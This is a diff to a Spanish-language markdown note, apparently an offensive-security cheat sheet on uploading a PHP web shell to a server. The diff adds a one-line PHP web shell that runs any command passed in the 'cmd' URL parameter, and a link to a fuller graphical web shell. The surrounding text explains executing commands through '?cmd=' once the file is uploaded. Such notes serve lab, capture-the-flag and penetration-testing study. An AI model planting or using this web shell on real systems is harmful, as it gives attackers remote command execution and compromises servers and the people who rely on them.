@@ -12,6 +12,17 @@ Crear un archivo PHP con este contenido:
 ?>
 ```
 
+```php
+<?php
+   system($_GET['cmd'])
+?>
+```
+
+enlace a webshell más gráfica:
+```
+https://github.com/flozz/p0wny-shell/blob/master/shell.php
+```
+
 ## Ejecutar Comandos
 
 Una vez subida, se ejecuta cualquier comando agregando `?cmd=` a la URL:
